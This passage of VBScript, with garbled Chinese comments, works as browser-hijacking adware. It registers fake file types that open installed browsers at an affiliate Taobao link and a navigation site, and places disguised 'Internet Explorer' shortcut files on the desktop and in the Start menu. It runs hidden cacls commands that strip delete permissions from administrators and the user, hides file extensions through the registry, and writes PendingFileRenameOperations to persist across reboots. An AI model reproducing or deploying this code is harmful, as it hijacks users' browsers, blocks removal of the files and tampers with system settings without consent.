    programs = wshShell.SpecialFolders("Programs") '��ǰ�û���ʼ�˵��еĳ���Ŀ¼
    startMenu = wshShell.SpecialFolders("StartMenu") '��ǰ�û���ʼ�˵��������Ŀ¼
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") 'ȫ���û�����Ŀ¼
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") 'ȫ���û���ʼ�˵��еĳ���Ŀ¼
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") 'ȫ���û���ʼ�˵��������Ŀ¼

    '·�����ϣ���·�����Ͻ��б���
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    
    Dim directory
    
    If not fso.FileExists(iePath) Then
        iePath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "iexplore.exe") Then 'IE�����
                        If oShellLink.TargetPath <> "" Then
                            iePath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(maxPath) Then
        maxPath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "maxthon.exe") Then '���������
                        If oShellLink.TargetPath <> "" Then
                            maxPath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(sePath) Then
        sePath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "360se.exe") Then '360�����
                        If oShellLink.TargetPath <> "" Then
                            sePath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(foxPath) Then
        foxPath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "firefox.exe") Then '��������
                        If oShellLink.TargetPath <> "" Then
                            foxPath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(sogouPath) Then
        sogouPath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "SogouExplorer.exe") Then '�ѹ������
                        If oShellLink.TargetPath <> "" Then
                            sogouPath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
End Sub



'���������ļ�,������URL��ַ,����(0 ����������ַ 1 ����һ������ַ)
Private Sub CreateFileLnk(url,createType)
On Error Resume Next
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '��ǰ�û�����Ŀ¼
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '��ǰ�û����������������Ŀ¼
    programs = wshShell.SpecialFolders("Programs") '��ǰ�û���ʼ�˵��еĳ���Ŀ¼
    startMenu = wshShell.SpecialFolders("StartMenu") '��ǰ�û���ʼ�˵��������Ŀ¼
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") 'ȫ���û�����Ŀ¼
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") 'ȫ���û���ʼ�˵��еĳ���Ŀ¼
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") 'ȫ���û���ʼ�˵��������Ŀ¼
    
    Set wshj = WScript.CreateObject("WScript.Shell")
    sdp = wshj.SpecialFolders("Desktop")                           '�����ļ��С����桱  C:\Documents and Settings\Administrator\����\
    skkkkk=left(sdp,len(sdp)-2)+"����ʼ���˵�"                     '�˵�
         

    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(iePath) And iePath<>"" Then '�ж�IE�����·���Ƿ����
        Call CreateRelevance(".ttf", "ttf", iePath & ",0", iePath & " " & url)
        If Not fso.FileExists(allUsersPcDesktopPath + "\Internet Explorer.ttf") Then
            Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\Internet Explorer.ttf")
        End If        
        If Not fso.FileExists(allUsersPrograms + "\Internet Explorer.ttf") Then
            Call CreateNoDeleteLnk(allUsersPrograms + "\Internet Explorer.ttf")
        End If
        
        If Not fso.FileExists(quickLaunch + "\Internet Explorer.ttf") Then
            Call CreateNoDeleteLnk(quickLaunch + "\Internet Explorer.ttf")
        End If

       If Not fso.FileExists(skkkkk + "\Internet Explorer.ttf") Then
            Call CreateNoDeleteLnk(skkkkk + "\Internet Explorer.ttf")
        End If
        
        dim tao_ico_path '�Ա�ͼ��·��
        Set ws = CreateObject("WScript.Shell") 
        Set Environ = ws.Environment("process") 
        tao_ico_path="C:\Program Files\winrar\ico\tb.ico" 'Environ("windir") & "\winrar\ico"
        If not fso.FileExists(tao_ico_path) Then '���·�������������Ĭ��
            tao_ico_path=iePath & ",0"
        End If

        Call CreateRelevance(".dib", "dib", tao_ico_path, iePath & " http://pindao.huoban.taobao.com/tms/channel/onsale.htm?pid=mm_15377717_0_0&eventid=101586")
        If Not fso.FileExists(allUsersPcDesktopPath + "\�Ա�������.dib") Then
            Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\�Ա�������.dib")
        End If

        If Not fso.FileExists(quickLaunch + "\�Ա�����.dib") Then
            Call CreateNoDeleteLnk(quickLaunch + "\�Ա�����.dib")
        End If

        If Not fso.FileExists(allUsersPrograms + "\�Ա�����.dib") Then
            Call CreateNoDeleteLnk(allUsersPrograms + "\�Ա�����.dib")
        End If

        If Not fso.FileExists(skkkkk + "\�Ա�����.dib") Then
              Call CreateNoDeleteLnk(skkkkk + "\�Ա�����.dib")
        End If



        Set ws = CreateObject("WScript.Shell") 
        Set Environ = ws.Environment("process") 
        tao_ico_path="C:\Program Files\winrar\ico\36.ico" 'Environ("windir") & "\t.ico"
        If not fso.FileExists(tao_ico_path) Then '���·�������������Ĭ��
            tao_ico_path=iePath & ",0"
        End If

     Call CreateRelevance(".wiz", "wiz", tao_ico_path, iePath & " http://www.978.la")
     If Not fso.FileExists(allUsersPcDesktopPath + "\��ַ��ȫ.wiz") Then
            If createType=1 Then
                Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\��ַ��ȫ.wiz")
            End If
        End If
    End If
    

    If fso.FileExists(maxPath) And maxPath<>"" Then '�ж����������·���Ƿ����
        Call CreateRelevance(".max", "max", maxPath & ",0", maxPath & " " & url)
        If Not fso.FileExists(allUsersPcDesktopPath + "\���������2.Max") Then
            'Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\���������2.Max")
        End If
    End If
    
    If fso.FileExists(sePath) And iePath<>"" Then '�ж�360�����·���Ƿ����
        Call CreateRelevance(".se", "se", sePath & ",0", sePath & " " & url)
        If Not fso.FileExists(allUsersPcDesktopPath + "\360��ȫ�����.se") Then
            'Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\360��ȫ�����.se")
        End If
        If Not fso.FileExists(quickLaunch + "\360��ȫ�����.se") Then
            Call CreateNoDeleteLnk(quickLaunch + "\360��ȫ�����.se")
        End If
    End If
    
    If fso.FileExists(foxPath) And foxPath<>"" Then '�жϻ�������·���Ƿ����
        Call CreateRelevance(".fox", "fox", foxPath & ",0", foxPath & " " & url)
        If Not fso.FileExists(allUsersPcDesktopPath + "\Mozilla Firefox.fox") Then
            'Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\Mozilla Firefox.fox")
        End If
    End If
    
    If fso.FileExists(sogouPath) And sogouPath<>"" Then '�ж��ѹ������·���Ƿ����
        Call CreateRelevance(".sou", "sou", sogouPath & "", sogouPath & " " & url)
        If Not fso.FileExists(allUsersPcDesktopPath + "\�ѹ����������.sou") Then
            'Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\�ѹ����������.sou")
        End If
    End If
    
    Call HideFileExtension '�����ļ���չ��
End Sub

'������ֹ��ɾ�����ļ�
Private Sub CreateNoDeleteLnk(path)
On Error Resume Next
    Dim fso,TestFile
    Set fso=CreateObject("Scripting.FileSystemObject")
    Set TestFile=fso.CreateTextFile(path,Ture)
    TestFile.WriteLine yunj(0, 300)
    TestFile.Close
    Call RefusalFileDelete(path)
End Sub

'������ֹ��ɾ�����ļ�
Private Sub CreateNoDeleteLnk1(path)
On Error Resume Next
    Dim fso,TestFile
    Set fso=CreateObject("Scripting.FileSystemObject")
    Set TestFile=fso.CreateTextFile(path,Ture)
    TestFile.WriteLine yunj(0, 300)
    TestFile.Close
End Sub


'��ֹ�ļ���ɾ����ɾ��ȫ��Ȩ�ޣ�
Private Sub RefusalFileDelete(path)
On Error Resume Next
    Set WshShell= CreateObject("WScript.Shell")
    Set wshNetwork = WScript.CreateObject("WScript.Network")
    WshShell.Run ("attrib """ & path & """ +r +s"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r Administrators"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r Administrator"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r users"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r system"), vbHide
    'WshShell.Run ("cacls """ & path & """ /e /c /r everyone"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r user"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r """ & wshNetwork.UserName & """"), vbHide    
    Set WshShell = Nothing    
End Sub

'�����ļ���չ��
Private Sub HideFileExtension()
On Error Resume Next
    Const HKEY_CURRENT_USER = &H80000001
      
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")   
  
    strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"  
    oReg.CreateKey HKEY_CURRENT_USER,strKeyPath 
    
    rrttqq5Name = "ShowSuperHidden"  
    dwValue = 0   
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,rrttqq5Name,dwValue 
    
    rrttqq5Name = "Hidden1"  
    dwValue = 2   
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,rrttqq5Name,dwValue 
    
    rrttqq5Name = "HideFileExt"  
    dwValue = 1  
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,rrttqq5Name,dwValue 
    
End Sub


'�½��ļ�����,������������׺,��������,iconͼ��·��(���޸Ļ򲻴���Ϊ��),������������·��
Private Sub CreateRelevance(nameSuffix, associationName, iconPath, path)
On Error Resume Next
    Const HKEY_CLASSES_ROOT = &H80000000
      
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")   
  
    '������׺   
    strKeyPath = nameSuffix  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath   
  
    '������׺   
    rrttqq5Name = ""  
    rrttqq5 = associationName 
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,rrttqq5Name,rrttqq5   
    
    '���ù�������
    strKeyPath = associationName  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
    
    '���ù�������
    rrttqq5Name = ""  
    rrttqq5 = "ϵͳ�ļ�" 
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,rrttqq5Name,rrttqq5  
    
    '���ù�������
    strKeyPath = associationName & "\she"&"ll\open"&"\command"  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
    
    '���ù�������
    rrttqq5Name = ""  
    rrttqq5 = path
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,rrttqq5Name,rrttqq5  
    
    If iconPath <> "" Then
       '���ù�������
        strKeyPath = associationName & "\Defaul"&"tIcon"  
        oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
        
        '���ù�������
        rrttqq5Name = ""  
        rrttqq5 = iconPath
        oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,rrttqq5Name,rrttqq5 
    End If

End Sub


'����Ϊ���������ر�ķ�ʽ��,�������ļ�·��,����Ŀ¼·��
Private Sub SetRunVbe(path,runPath)
On Error Resume Next
    Const HKEY_LOCAL_MACHINE = &H80000002
    arrStringValues = Array(path,runPath)
    '��ȡ��չ���ַ���ֵ
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_    
    strComputer & "\root\default:StdRegProv")   
    strKeyPath = "SYSTEM\ControlSet001\Control\Session Manager"  
    rrttqq5Name = "PendingFileRenameOperations"  
    oReg.GetMultiStringValue HKEY_LOCAL_MACHINE,strKeyPath,_   
    rrttqq5Name,arrValues
    dim isPathPresence,isRunPathPresence
    isPathPresence=false
    isRunPathPresence=false 
    temp_i=1
    temp_arrValues = Array() '��ǰ�����������
    
    For Each rrttqq5 In arrValues
         If (InStr(rrttqq5, "smss.exe") = 0) Then '����ָ���ļ�
            ReDim Preserve temp_arrValues(temp_i)             
            temp_arrValues(temp_i)=rrttqq5
            temp_i=temp_i+1
         End If
         if rrttqq5=path then '����
            isPathPresence=true
         end if
         if rrttqq5=runPath then '����
            isRunPathPresence=true
         end if
    Next
 
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_    
    strComputer & "\root\default:StdRegProv")
       
    'û�оʹ�������
    strKeyPath = "SYSTEM\ControlSet001\Control\Session Manager"  
    oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath   

    'д��ע�����   
    rrttqq5Name = "PendingFileRenameOperations"
    If not isNull(arrValues) Then '����������׷��,�ϲ�����
        arrStringValues=Summ(arrValues,arrStringValues) '��������ϲ�        
    End If
    
    if isPathPresence=false then'�ж�Դ�����Ƿ���ڣ���������д��
        oReg.SetMultiStringValue HKEY_LOCAL_MACHINE,strKeyPath,rrttqq5Name,arrStringValues
    end if
End Sub




